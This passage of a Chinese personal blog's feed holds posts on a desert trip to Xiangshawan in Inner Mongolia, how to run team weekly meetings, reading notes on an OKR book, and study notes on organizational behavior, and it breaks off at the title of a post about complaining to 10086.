        <content type="html"><![CDATA[<p>上周四跟着团队去内蒙古玩了几天，对于一个南方人来说，北方处处都散发着迷人的风味。</p><p>本来规划是去草原，据有效情报，这个季节草原上的草还没有完全长起来，除了一堆粪便，没有几个有意思的项目，加上蒙古包里的饮食水平也还停留在「维持生命」阶段，综合考虑，最终决定去沙漠里浪几天，也算是工作之余挖掘些新鲜和刺激。</p><p>本文不算一篇游记，主要想说一下，去沙漠会遇到几个有意思的东西，以及需要准备些什么。</p><h3 id="响沙湾"><a href="#响沙湾" class="headerlink" title="响沙湾"></a>响沙湾</h3><p>我们去的地方叫做「银肯响沙湾」，是一个私人承包的 5A 级景区，面积不算大，是大沙漠的一处边界位置，在地图上看过去也就是一个小点。别的地方都在防止沙漠化，而银肯响沙湾则是经常除草，防止沙漠面积减小，足见其迷你。</p><p><img src="/../blogimgs/2019/05/29/%E5%93%8D%E6%B2%99%E6%B9%BE-%E9%AA%86%E9%A9%BC.png" alt="upload successful"></p><h3 id="沙漠暴雨"><a href="#沙漠暴雨" class="headerlink" title="沙漠暴雨"></a>沙漠暴雨</h3><p>响沙湾中央坐落着一家别致的酒店，酒店附近有两处沙地，一个叫做先沙岛，都是些比较刺激的娱乐项目，另一个叫做悦沙岛，适合玩累了以后看看表演、沐浴阳光。</p><p><img src="/../blogimgs/2019/05/29/%E5%93%8D%E6%B2%99%E6%B9%BE-%E7%BC%86%E8%BD%A6.png" alt="upload successful"></p><p>可以坐缆车从沙漠外围直达莲花酒店，不巧的是，刚下缆车，一阵狂风骤雨下了起来，猛烈到什么程度呢？伞是不能打的，身体轻一点能把你吹倒咯。<strong>所以去沙漠，轻薄雨衣是必不可少的。</strong></p><h3 id="瞬间转晴，烈日当空"><a href="#瞬间转晴，烈日当空" class="headerlink" title="瞬间转晴，烈日当空"></a>瞬间转晴，烈日当空</h3><p>五六月份去银肯响沙湾，昼夜温差还是比较大的，高的时候 32° 左右，低的时候 10° 左右，由于不是沙漠腹地，极高和极低都不会那么夸张，带上<strong>一件小外套</strong>也就够了，对于有点脂肪的朋友，一件防晒衣估计也够了。酒店条件与我们平时住的都差不多，该有的都有。</p><p><img src="/../blogimgs/2019/05/29/%E5%93%8D%E6%B2%99%E6%B9%BE-%E7%83%88%E6%97%A5.png" alt="upload successful"></p><p>防晒霜带不带我觉得问题都不大，因为我相信你进入沙漠以后，一定会把自己裹得严严实实，有<strong>帽子、魔术方巾、防晒衣、长裤</strong>等等。</p><h3 id="滑沙-amp-爬沙"><a href="#滑沙-amp-爬沙" class="headerlink" title="滑沙&amp;爬沙"></a>滑沙&amp;爬沙</h3><p>去之前我在迪卡侬买了一个登山用的<strong>多功能小背包，里面有一个 2L 的水袋</strong>，露着一根长长的吸管，喝水尤为方便，不过现在想想，由于没有深入沙漠，双手也都空着，背个书包就够了。</p><p><img src="/../blogimgs/2019/05/29/%E5%93%8D%E6%B2%99%E6%B9%BE-%E7%88%AC%E6%B2%99.png" alt="upload successful"></p><p>滑沙这个项目还是比较有意思的，坐在一块长方形的木板上，从几十米高、坡度约摸 75° 的沙顶滑下来，双手不离开沙面，自己控制下滑的速度，可惜只玩了一次，接着玩需要自己爬上去，太高太陡人还多，就算了。</p><p>不少同学的手表、手机都遭了罪，沙漠的沙子非常细，除非是运动手表，一般的手表和手机都会有沙子伸进去，结果就是手机充电口插不进线，或者手表里有看得见的沙。所以，<strong>你的裤子和衣服一定要有拉链，在滑沙的时候也建议你带上手套</strong>。</p><h3 id="沙漠徒步"><a href="#沙漠徒步" class="headerlink" title="沙漠徒步"></a>沙漠徒步</h3><p>最期待的一个活动是沙漠徒步，走过了三个沙丘和一个大沙丘，从大沙丘滑下来的时候，听沙响，轰隆隆的声音，像是什么东西要从地底下钻出来似的，特别有意思的一个自然现象，这也正是“响沙湾”的来由。</p><p><img src="/../blogimgs/2019/05/29/%E5%93%8D%E6%B2%99%E6%B9%BE-%E9%AA%86%E9%A9%BC2.png" alt="upload successful"></p><p>徒步之前，我们穿好了酒店提供的<strong>沙漠鞋套，这个你不用买，</strong>，没有鞋套，沙丘上一脚踩下去，估计会进一鞋的沙，你可以打赤脚，据说很舒服，但是也有风险，有些动植物是有毒的，一不小心就会弄个奇痒无比。即使带了鞋套，回来的时候鞋子里也进了不少沙子，还是太细了。</p><p>来回说有五公里，实则也就三公里的样子，但是好几个伙伴已经累到不行，甚至还有一个已经中暑，幸好我带了<strong>两根登山杖</strong>，在上下沙丘的时候给我省了不少气力，去之前也喝了<strong>两瓶藿香正气水</strong>。</p><h3 id="念头"><a href="#念头" class="headerlink" title="念头"></a>念头</h3><p>内蒙之行给我的印象还是挺深刻的，第一天在呼和浩特市区，一个蒙古包里，吃着羊肉，看着表演；第二天和第三天呆在鄂尔多斯的银肯响沙湾；最后一天又回到了市区，吃吃逛逛。回来的时候，嘴皮子已经干裂到快出血了，建议朋友们带上一支好的<strong>润唇膏</strong>。</p><p><img src="/../blogimgs/2019/05/29/%E5%93%8D%E6%B2%99%E6%B9%BE-%E5%BF%B5%E5%A4%B4.png" alt="upload successful"></p><p>银肯响沙湾，等孩子大点了，应该还会去一趟，带着家人一起在这被驯化的沙漠里玩一玩。</p>]]></content>
      
      
      <categories>
          
          <category> 在路上 </category>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 沙漠 </tag>
            
            <tag> 旅行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>团队周会怎么开？</title>
      <link href="/blog/2019/05/21/weekly-report/"/>
      <url>/blog/2019/05/21/weekly-report/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这是一篇两年前未发表的旧文，公开发表下。</p></blockquote><p>给大家分享一下，周会怎么开，主要涉及形式和内容，个人见解，欢迎讨论。</p><p>在淘宝三年，待过的小团队有五六个，有两个团队不开周会，其他几个团队每周一次，形式不一。有一些效果不错，但也不可避免的，有些团队里头，周会只是个形式，汇报下工作就结束了。</p><p>一个团队，规模大小，有 3<del>5 人，也有 5</del>10 人，一个 Leader 带超过 10 人的团队，其实是不常见的，不是 Leader 能力不行，而是没办法把精力分散到太多人身上，一般超过 20 人的团队，都会分成两到三个小 Team，Team Leader 向团队 Leader 汇报。</p><h3 id="团队规模不同，周会的开展形式也会不太一样。"><a href="#团队规模不同，周会的开展形式也会不太一样。" class="headerlink" title="团队规模不同，周会的开展形式也会不太一样。"></a>团队规模不同，周会的开展形式也会不太一样。</h3><p>3~5 人的团队，可能平时吃饭就在一起，任何事情都有很多机会交流，Leader 和成员之间很容易融入，那么周会可能真的就是个形式，我待过的不开周会的团队，要不是因为团队规模太小，要不是因为团队成员能力都很强，特别主动，根本不需要开周会。</p><p>5~10 人的团队，周会形式可能会丰富许多，毕竟大家做的事情还是存在差异的，比如业务上的差异、工程上的差异、技术原理上的差异等等。如果仅仅是工作上的汇报，很多同学可能根本就不会去关注其他人的进展，结果就是底下汇报，就 Leader 一人在听，剩下的人埋头干着其他的事情。所以，往往人多的团队，会产出比较丰富的周会形式。</p><h3 id="那么，周会上，需要把握好哪些事情呢？"><a href="#那么，周会上，需要把握好哪些事情呢？" class="headerlink" title="那么，周会上，需要把握好哪些事情呢？"></a>那么，周会上，需要把握好哪些事情呢？</h3><p>作为一个 Leader，如果手下人员比较多，而且自己也有很多艰巨的任务在身，那么他会相当珍惜周会时间，毕竟这可能是他了解团队整体情况的少数渠道之一，这个时候，他会特别关注每个同学手里头的项目进度、问题、风险以及在项目中的想法和思考，在周会沟通中，也主要就是这么几个点。这种形式久了之后，就会感觉，周会便是念周报，无趣的很。</p><p>周会，一周就那么一次，一次也就 2 个小时左右（人多的话，大概一个下午），时间并不长，它做不了很多事情，工作汇报是关键点，但是汇报不应该是周会的全部。</p><h4 id="一、站在-Leader-角度"><a href="#一、站在-Leader-角度" class="headerlink" title="一、站在 Leader 角度"></a>一、站在 Leader 角度</h4><p><strong>1. 首先要把握好团队的健康程度，比如每个项目存在的问题和风险，团队成员的情绪问题、加班情况，所有人员的时间投入占比等。</strong></p><p>项目的细节问题可以通过周报或者在日常沟通中去了解清楚，周会上主要暴露出项目中已知或者未知的风险，已知的风险一定需要一个具体可实施的对策，这个对策可以是当事人给出的，也可以是大家群策群力想出来的，提前预判风险，可以让一个项目良好地进行。其他细节问题，不应该花太多时间在周会上，除非这些点能够让人有所启发，或者是大家的共性问题。</p><p><strong>2. 做好信息的「向下传递」。</strong></p><p>汇报是从下而上的消息传递路径，而自上而下的消息传递也相当重要。需要让小组成员了解整个团队的规划和目标，实时同步目标的微调和变化，分享周边团队的工作内容等。上下目标越一致，整个团队的生态越健康。</p><p><strong>3. 帮助团队成员深入到业务，技术是为产品服务的，只有把产品理解透彻了，才能够恰如其分地用好技术。</strong></p><p>在一群人面前讲话的机会并不多，周会就是一个很好的场景，让团队同学给所有人分享产品的规划，一方面是给他机会说话，一方面也可以让更多的人了解团队正在做的事情。不论是技术产品还是业务产品，最好能够在团队中做到一个主力、一个副手，副手位是业务的备胎，更是一种让团队成员涉及更广的场景的渠道。带领团队成员讨论产品细节，以及如何提前在技术上为产品的发展布局。</p><p><strong>4. 每次准备一个话题，收集问题、看法和想法。</strong></p><p>针对团队中出现的一些问题、场景，或者社区热门的事件等，准备一个话题，让每个人发表看法，回答团队的疑问，收集团队的想法，给出最后的总结。</p><h4 id="二、站在团队成员的角度"><a href="#二、站在团队成员的角度" class="headerlink" title="二、站在团队成员的角度"></a>二、站在团队成员的角度</h4><p><strong>1. 及时抛出问题和方案，及时寻求支援。</strong></p><p>有些问题的沟通是需要你一句我一句的沟通才能说清楚的，周报上没说，就一定要在周会上沟通清楚，把问题的背景交代清楚，遇到的问题和自己思考的方案先抛出来，让周会上所有的人集思广益，收集好的点子，带到日常的开发中去。如果在排期上存在风险，要及时的提出来，向主管寻求支援。</p><p><strong>2. 每次输出一个知识点。</strong></p><p>准备一些有思考的或者有技术含量的分享，5~10 分钟。把一个技术点、业务中遇到的问题、某个工具的使用或者产品的架构等等，分享给小伙伴。提前准备几页 PPT，说透。</p><p><strong>3. 了解团队的动向，调整自己的时间分配</strong></p><p>业务上的「技术含量」可能不高，一般每个同学都会在业务之外干点团队或者个人的项目，比如做一个调试平台、接口中心、测试工具等等。从大团队和小组中不断收集反馈，记下有启发的点子，寻找可以合作和技术推广的渠道。把时间聚焦到团队最紧迫的地方。</p><h3 id="周会形式"><a href="#周会形式" class="headerlink" title="周会形式"></a>周会形式</h3><p>之前有个 Leader 从来不开周会，其实感觉也挺爽的，没啥不好，主要还是因为团队成员自觉性很高，遇到的问题基本上都在平时沟通掉了，很少存在拖拉的情况。</p><p>还有一个 Leader，刚开始不开周会，后来觉得不太好，于是，每周五中午请小组吃饭，边吃边汇报，这种感觉就更爽了，我们一般挑最贵的点。</p><p>有一个 Leader，周会很准时，但是开得特别短（也可能很长…），前半段是向上反馈，问题和风险；后半段是向下反馈，变化和调整；剩下的时间是产品发展讨论，以及排期设定。最长的一次周会开了 7 个小时，开到半夜两点多…那是因为整个团队投入在一个项目中，基本上就属于项目沟通了。</p><p>有一个 Leader，喜欢把我们拖到项目室，水果、零食伺候，谈什么都行。</p><p>总之，怎么爽怎么来。周会的目的之一就是增进团队的感情。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和想法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 周会 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>读《OKR 工作法》</title>
      <link href="/blog/2019/05/16/book-reading-about-okr-working-methods/"/>
      <url>/blog/2019/05/16/book-reading-about-okr-working-methods/</url>
      
        <content type="html"><![CDATA[<p>花了两天功夫把 <a href="https://www.amazon.cn/dp/B07577T3XS/ref=sr_1_1?__mk_zh_CN=%E4%BA%9A%E9%A9%AC%E9%80%8A%E7%BD%91%E7%AB%99&keywords=okr%E5%B7%A5%E4%BD%9C%E6%B3%95&qid=1557965131&s=gateway&sr=8-1">《OKR 工作法》</a> 读了一遍，有一点收获，稍微记录下所思所想。</p><p><img src="/../blogimgs/2019/05/16/book-OKR.png" alt="upload successful"></p><p>这本书内容并不多，前面几章通过一个创业故事让读者对 OKR 有一个整体的体感，后面两个章节，详细讲了 OKR 中 O 和 KR 具体的场景，应对的策略和背后的思考。</p><p>笔者在阿里巴巴工作，厂里推行的是 KPI 绩效考核制度，与 OKR 的理念还是有挺大的差异。两者都是目标实现的管理工具，前者不仅会帮助管理目标，而且会与薪资、晋升等挂钩，这就导致了，践行 OKR 的公司员工会更加注重公司&#x2F;团队的目标实现，而践行 KPI 的公司员工会更加注重如何保质保量地完成个人目标。既然是管理工具，自然得看管理者能不能用好；两者都有各自的应用场景，没有好坏之分。</p><p>由于之前对 OKR 了解不多，仅靠读一本书也难以达到深入理解的状态，后续一年，我会通过 <a href="https://worktile.com/">worktile</a> 提供的目标管理工具进行一年的家庭&amp;个人目标管理，以此来熟悉 OKR 工作法。</p><p>OKR 是一套定义和跟踪目标及其完成情况的管理方法，大致是：</p><ol><li>首先需要制定一个为期至少 3 月鼓舞人心的目标（Objective）</li><li>针对目标思考几个关键结果（Key Result），用于衡量效果</li><li>确定好本周需要推进的事项，以及其优先级，每周 review 目标和关键结果</li><li>确定好未来 1 月需要推进的事项</li></ol><p>从上面的几点可以感受到，OKR 一直在帮助践行者聚焦目标，帮助监督所做的每一件事情都对目标有帮助，将最能够触达目标的事情优先级提到最高。下面解释下为什么要这样做，以及这样做为什么会取得好的结果。</p><h3 id="目标的设定"><a href="#目标的设定" class="headerlink" title="目标的设定"></a>目标的设定</h3><p><strong>目标的设定一定要鼓舞人心</strong>，OKR 工作法中提到了一个自信指数，如果你有 100% 把握完成目标，说明这个目标门槛太低了；如果信心指数低于 50%，那么实施起来压力会特别大，过程中遇到一点阻碍，可能就放弃了；70% 是一个很好的阈值，即基本上可以达到目标但又会有一点挑战。自信指数是随着时间的推移不断变化的，每周都要重新调整。</p><p>另外，<strong>目标不宜过短</strong>，一两周就能完成的工作，那个不能叫做目标，最多是个任务。周期最好是一个季度以上。</p><p>在设定目标之前，一定需要<strong>为全员灌输长期的使命</strong>，这个使命至少可以维持 3~5 年，比如阿里巴巴的使命是“让天下没有难做的生意”，谷歌的使命是“整合全球信息，使人人皆可访问和收益”等等。有了长期的使命，每个阶段所拟定的目标就不会有大的偏差。</p><p>除非有好几个互不相交的方向，否则目标有一个就行了，<strong>不要太多</strong>。</p><h3 id="关键结果"><a href="#关键结果" class="headerlink" title="关键结果"></a>关键结果</h3><p>关键结果是用来衡量目标的，一定要反复对焦目标来确定 3~4 个关键结果，确保关键结果是可以支撑实现目标的，正向推导、反向演绎等，通过多种方式确保关键结果的拟定准确性，这个过程一般需要多轮对焦和辩论。</p><p>若你看到关键结果内心有点小激动或小彷徨，那就对了，需要有点挑战才能拿到符合预期的目标结果。</p><p><strong>关键结果应该是可衡量的</strong>，最好遵循 <a href="https://en.wikipedia.org/wiki/SMART_criteria">SMART</a> 原则来制定。</p><h3 id="过程监督"><a href="#过程监督" class="headerlink" title="过程监督"></a>过程监督</h3><p><strong>OKR 的意义不仅仅在于完成目标，更重要的是帮助团队挖掘真正的实力</strong>。在每周的进度跟进会上，不应该把所做的事情当做汇报和考核结果来呈现，应该通过反复的对焦，确定所做的事情是对目标有意义的，对目标有推进作用的。</p><p>在 OKR 践行过程中，要确保短期和中长期要做的事情，不断调整和确认优先级，以确保整个团队的信心指数是在持续提升的。过程中需要及时处理风险和问题，以防出现过大的偏差。</p><p>通过一个阶段（季度）的实践，基本可以摸索出团队的综合实力，对比阶段开始前设定的目标和团队拿到的结果，可以看出团队是否故意隐藏了实力，或者是否目标设置得过高，在下一个阶段作出合适调整。一方面，可以更好的完成目标，另一方面，不断的挖掘、培养和提升团队的综合实力。</p><hr><p>后续将用一年时间来感受下 OKR，希望一年以后可以有更深的感悟。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记本 </category>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OKR </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《组织行为学》学习笔记</title>
      <link href="/blog/2019/05/12/organizational-behavior-study-notes/"/>
      <url>/blog/2019/05/12/organizational-behavior-study-notes/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在得到上学习李育辉老师的<a href="https://m.igetget.com/share/course/pay/detail/36/46">《组织行为学》</a>课程，每个章节都做了点笔记，单纯看笔记一点体感都没有，感兴趣的同学可以结合<a href="https://m.igetget.com/share/course/pay/detail/36/46">课程中</a>生动的例子进行学习和理解。</p></blockquote><p>生物操心的事情：</p><ul><li>细胞自身成长和代谢</li><li>细胞之间的协作</li><li>与外部环境互动</li></ul><p><strong>组织行为学是研究个体规律、个体之间的关系，以及大结构对组织的影响，</strong></p><ul><li><strong>立场：公司</strong>。以组织为导向的学科，将组织的利益放在第一位；满足企业自身利益，再兼顾个体需求和社会需求，才能良好地达到三赢。</li><li><strong>研究方法</strong><ul><li>经验主义学派：计划、组织、指挥、协调、控制。强调抽象、简洁、普世。</li><li>实证主义学派：做实验！追求复杂、多元、有条件限制的结论。</li></ul></li><li><strong>基本观点：权变</strong>。因时而变，因势而变。</li></ul><style>  .post-content hr {    border-top: 1px dashed #CCC !important;    height: 0 !important;    background: none !important;  }  .post-content blockquote p {    white-space: normal !important;  }</style><hr><h3 id="一、激发个体"><a href="#一、激发个体" class="headerlink" title="一、激发个体"></a>一、激发个体</h3><p>人是复杂的。不要把人看成只考虑经济利益、可以被简单操控的乌合之众。</p><p>　　↑</p><p><strong>人的底色可变</strong>，多元性、复杂性，人格、情绪、角色的变化。招聘需要注意，什么靠挑选，什么反而可以靠培养。</p><hr><h4 id="个性"><a href="#个性" class="headerlink" title="个性"></a>个性</h4><p>情景强度：迫使个体人格改变的第一要素，不是情景有多复杂，也不是持续的时间，而是<strong>强度</strong>。</p><ul><li><strong>明确性</strong>，清晰、明确、单一的工作</li><li><strong>一致性</strong>，指令相互兼容</li><li><strong>约束性</strong>，限制个体自由</li><li><strong>严重性</strong>，个体行为的后果</li></ul><hr><h4 id="情绪"><a href="#情绪" class="headerlink" title="情绪"></a>情绪</h4><p>资源保存理论：<strong>情绪是一种资源</strong>，需要补充。每个人的情绪资源都是有限的。资源缺失时，潜意识会将其当做威胁；缺失太快，身体会作出反应避免损失。</p><ul><li>场景没有发生改变，导致消耗快</li><li>情绪反馈路径缺失，导致补充少</li></ul><p>补充情绪资源的路径：</p><ul><li>生理资源互补，如健身、睡觉</li><li>强迫大脑跳出目前的情景，如冥想</li><li>用亲密关系来补充，比如爱情</li></ul><hr><h4 id="动机"><a href="#动机" class="headerlink" title="动机"></a>动机</h4><p>传统的动机理论都是默认组织是工作任务的主人公，而员工是配角：</p><ul><li><strong>双因素理论</strong>，公司的奖励手段：<ul><li>保健因素：薪酬、工作环境、同事关系等</li><li>激励因素：晋升机会、对个体的尊重等</li></ul></li><li><strong>需求理论</strong>，成就、权利、对群体的归属感等。</li></ul><p>当代动机理论，员工要成为工作的主角（自我掌控）：<strong>当那些能让自己乐在其中的任务变成一种义务的时候，个体的动机就会被破坏。</strong></p><ul><li>自我一致性</li><li>目标设置理论，KPI 更像是组织强加，OKR 像是自我目标驱动</li></ul><p>将员工当做投资对象来看待。如建立 OK 合伙人机制，O 为 小 CEO，K 为 小 CTO。</p><hr><h4 id="角色"><a href="#角色" class="headerlink" title="角色"></a>角色</h4><p>工作和生活，两个角色扮演带来的冲突问题解决：</p><ul><li>不要用工作时间划定界限<ul><li>在特殊的社会时期，时间和劳动成果是划等号的</li><li>如今的知识经济时代，用时间评估成果越来越难</li><li>工作以任务为基本单元，而时间只是任务的一个要素</li></ul></li><li>角色理论<ul><li>不同场景中扮演的不同角色会引导出不同的反应</li><li>角色的转换会消耗认知能量</li><li>一个人在工作和生活中扮演的角色不一样，但是经常因为没有及时切换而发生重叠</li></ul></li><li>角色管理<ul><li>工作分清主次，主要工作在工作时间内完成，非主要工作，员工次要时间处理</li><li>设置统一的交流时间，根据时间集中度来分离员工角色</li><li>帮助个体减少他承担家庭角色的压力</li></ul></li></ul><hr><h4 id="组织承诺到职业承诺的转变"><a href="#组织承诺到职业承诺的转变" class="headerlink" title="组织承诺到职业承诺的转变"></a>组织承诺到职业承诺的转变</h4><p><strong>组织承诺</strong>是员工贡献给组织的忠诚度，是企业千方百计想要从优秀员工那里争取到的东西。</p><p>现在，每个人虽然笔头上是和公司签合同，但是心里却是和自己的职业签。因为不放心组织，所以要给自己选择一条职业发展的塞到，然后把未来寄托在它身上。这是<strong>职业承诺</strong>。</p><p>对于优秀的员工：</p><ul><li>通过制度保障员工的自我突破</li><li>越是优秀的人，越在乎自己正在和谁共事，越是在乎自己能不能从其他人身上学到东西</li><li>鼓励员工走出公司，走进世界</li></ul><p><strong>核心在于鼓励员工在工作中遇见“未知数”，目的是让他们成长</strong>。</p><p>从长期来看，优秀的员工只忠于职业，而不是忠于企业，所以企业必须要转变思路，让自己成为商品。对个体的职业发展服务。</p><hr><h4 id="深度的激励措施"><a href="#深度的激励措施" class="headerlink" title="深度的激励措施"></a>深度的激励措施</h4><p>常规激励手段失效后的措施：</p><ul><li>把荣誉颁发到员工家中</li><li>工作嵌入，如将影响力扩展到员工的社区和家庭，给他们带来额外的利益</li><li>为员工打造外部关系网，如员工家属福利，涵盖医疗、教育、社会福利保障等</li></ul><hr><h4 id="彩虹理论"><a href="#彩虹理论" class="headerlink" title="彩虹理论"></a>彩虹理论</h4><p><strong>中国劳动力成本持续走高的趋势，短期内不会改变。</strong></p><p>彩虹理论：人的一生可概括为一条彩虹，彩虹有两个维度，一个是掺毒，也就是我们的年龄，另一个是宽度，也就是我们生活的广度。</p><ul><li>一个人扮演几个不同的角色比扮演相似的角色有更多的满足感</li><li>总有一个角色是相对重要的，称之为“显著角色”</li><li>当一个角色从个体身上剥离的时候，称之为“角色退出”</li><li>为了填补确实的满足感，个体会寻找并且加强新的“显著角色”</li></ul><p>如果把人力当做资源，每个年龄段的员工，都有他可以被利用的价值，即便是 60+ 的老年阶段。</p><hr><h3 id="二、领导团队"><a href="#二、领导团队" class="headerlink" title="二、领导团队"></a>二、领导团队</h3><p>领导力不仅仅是团队领导者的个人特质，更是一种存在于他和成员之间的互动关系。</p><ul><li>招到人</li><li>争取信任，建立默契</li><li>做好决策</li></ul><hr><h4 id="招人"><a href="#招人" class="headerlink" title="招人"></a>招人</h4><p>岗位正在变得越来越复合，清晰描述越来越困难。<strong>人-岗匹配</strong>，组织将个体特征，通常是能力和经验，与工作岗位的要求进行匹配，来确定合适的人选。</p><ul><li><strong>人-人匹配</strong>，不描述岗位而是描述优秀个体</li><li><strong>角色匹配</strong>，考察应聘者能否承担好相应的团队角色。实干家、创新者、协调者、熟虑者等</li><li><strong>潜力匹配</strong>，高绩效并不等于高潜力，判断维度：<ul><li>学习的积极性</li><li>眼界的宽度，完整的知识结构</li><li>理解他人，共情</li><li>成熟度</li></ul></li></ul><hr><h4 id="合群"><a href="#合群" class="headerlink" title="合群"></a>合群</h4><p><strong>非正式组织</strong>，在个体融于组织过程中，承担了重要的中间人作用。</p><p>互联网技术让建立非正式组织的成本降低了，这点可以充分利用起来。</p><hr><h4 id="领导力"><a href="#领导力" class="headerlink" title="领导力"></a>领导力</h4><p>追随者特立独行，愿意主动表达意见，甚至有点我行我素。自恋型人格崛起，原因：</p><ul><li>父母培养的教育理念，看重自尊心</li><li>贷款方便，经济条件制约力减弱</li><li>社会自我肯定的文化，如媒体节目，真人秀</li><li>社交媒体的便捷性，并提供了屏蔽和拉黑能力</li></ul><p>如何领导自恋型人格人群：</p><ul><li>让他们觉得你很厉害</li><li>让他们觉得自己很厉害</li></ul><p>领导者就需要让自己有缺陷，让团队成员感受到， leader 总体还行，但是也有搞不定的地方，得我来。<strong>暴露情绪，而非能力缺陷。</strong></p><hr><h4 id="凝聚力"><a href="#凝聚力" class="headerlink" title="凝聚力"></a>凝聚力</h4><ul><li>利用相对剥夺来提升团队凝聚力，领导者可以在待人的态度上做到有所区分；</li><li>一定要注意，剥夺的是自尊心等虚一点的东西，决不能和绩效有关；</li><li>剥夺也要讲究“公平”；</li><li>为了把负面效果降到最低，要给足团队成员必要的辅助与资源。</li></ul><hr><h4 id="决策"><a href="#决策" class="headerlink" title="决策"></a>决策</h4><p>“团体迷思”，团队成员太看重共识，以至于为了达成一致意见，会忽略决策目的，放弃某些事实，从而导致判断失误。几个表现：</p><ul><li>对自身的高估</li><li>封闭保守</li><li>寻求一致</li></ul><p>问题的核心出在果断团结身上，组织行为学提出的手段，围绕减少“内聚动力”展开：</p><ul><li>要让成员同时扮演批评性评估者的角色；设立唱反调的人</li><li>在同一个问题上设立若干独立的评估团队，每个团队在不同的领导者带动下单独商议，然后再汇总；引入外部视角</li><li>处于团队结构中心的任务，应该做到公正无私；弱化强势者</li></ul><hr><h3 id="三、重塑组织"><a href="#三、重塑组织" class="headerlink" title="三、重塑组织"></a>三、重塑组织</h3><p>组织行为学要探讨个体、群体、组织结构这三件事。先搭班子，再定战略，为何？</p><ul><li>现有的班子，不适合当前的战斗</li><li>边调整边干活，效果滞后，远水不解近渴</li></ul><p>组织就是很多很多小的领导力关系放在一起，组成的大领导力关系。形成一个稳定的、有战斗力的结构，一定需要时间，急不得。很多人事变更，牵一发而动全身。</p><hr><h4 id="去中心化"><a href="#去中心化" class="headerlink" title="去中心化"></a>去中心化</h4><p>传统的解决办法面临的挑战是组织规模限制，人数不能太多。去中心化首先需要找到节点人物，什么是节点人物：</p><ul><li>喜欢率先发起协作、组织讨论，但是不发表主宰性的一件，而是鼓励想法河流继续前进</li><li>善于分享外部的情报</li><li>擅长指定规则，总是保证推进的方向不发生严重偏离，而是为信息传递保驾护航</li></ul><p>如何简单找到节点人物：通过数据加权统计，看看个体在关键事件或者核心操作上执行的频度，比如收发邮件的次数、发起讨论的次数、指定规则的次数、创意加工的次数等等。</p><hr><h4 id="授权"><a href="#授权" class="headerlink" title="授权"></a>授权</h4><p>授权走样，一种情况是管的太细，一种情况是放任不管：</p><ul><li>是否规定职责边界？</li><li>是否提供了必要的辅导？</li><li>如果失败，风险和后果谁承担？</li></ul><p>加强心理授权：目标的内化、控制感和效能感。</p><p>授权走样的本质上都是犯了一个错误，就是组织把授权的目的搞错了。<strong>授权的对象不应该是事，而是培养下属，授权的对象应该是人。</strong></p><p><strong>如果你给了下属授权，反馈的就不应该是具体的做法，而是对他能力增长的评价。</strong></p><hr><h4 id="冲突"><a href="#冲突" class="headerlink" title="冲突"></a>冲突</h4><p>冲突可以分为三类：</p><ul><li>任务冲突，任务本身的不合理</li><li>关系冲突，人际关系之间发生了问题</li><li>程序冲突，授权和角色发生了冲突</li></ul><p>以上<strong>只有关系冲突是恶性的，而且不易察觉，任务冲突、程序冲突都是在帮助组织发现问题</strong>。为了减少关系冲突产生的可能性，应该：</p><ul><li>公开化，并且制定详细、明确的处理程序</li><li>引入外部第三方来评判，给组织找个裁判</li><li>人为制造冲突，解决现有矛盾</li></ul><hr><h4 id="办公室政治"><a href="#办公室政治" class="headerlink" title="办公室政治"></a>办公室政治</h4><p><strong>办公室政治很难彻底根除，因为它不是组织与个人之间的矛盾，而是组织与资源之间的矛盾</strong>。也就是说，资源有限是办公室政治发生的本质原因。</p><ul><li>政治行为肯定会带来内耗，因为个人的经历，转移到了与工作无关的地方，他会对组织绩效产生负面影响</li><li>办公室政治无法避免，每个人最开始展开政治行为都是为了获得权力，服务于个人目标；管理者应该控制个人目标的比例，不能伤害组织的利益</li><li>管理办公室政治，最重要的是评估风险，缩短持续时间，说白了让他快点过去。领导者不能置身事外，杳然给自己变成最大的权利砝码</li><li>管理者应该通过沟通消解矛盾；如果不可消解，宁可激化矛盾后，选择其中一个</li><li>一定要做好善后工作，事后详细解释，避免集成员工错误归因和盲目模仿</li></ul><hr><h4 id="知识管理"><a href="#知识管理" class="headerlink" title="知识管理"></a>知识管理</h4><p>知识管理的几个问题：隐瞒、隐性知识、不同变通。</p><p>表面上，知识管理就是手机、储存、共享有价值的信息和经验。但是深层思考，目的还是为了方便员工学习，更好地解决问题。</p><ul><li>组织高频率、仪式感强的只是分享活动；</li><li>保证相关人员都参与，建立对他人知识结构的认知</li><li>帮助员工进行换位思考，理解他人行动背后的逻辑思维</li><li>格外重视关于失败、妥协、变通的经验分享</li></ul><hr><h3 id="四、书单推荐"><a href="#四、书单推荐" class="headerlink" title="四、书单推荐"></a>四、书单推荐</h3><ul><li>克里斯·阿基里斯《个性与组织》</li><li>弗雷德里克·莱卢《重塑组织》</li><li>罗恩和戴维联合写的《无边界组织》</li><li>《自由企业》</li><li>奥托·夏莫《U 型理论》</li></ul>]]></content>
      
      
      <categories>
          
          <category> 杂物间 </category>
          
          <category> 剪贴板 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 组织行为学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何策略性投诉 10086，以减少电话骚扰的可能性</title>
      <link href="/blog/2019/05/06/complaint-to-10086/"/>
      <url>/blog/2019/05/06/complaint-to-10086/</url>
      
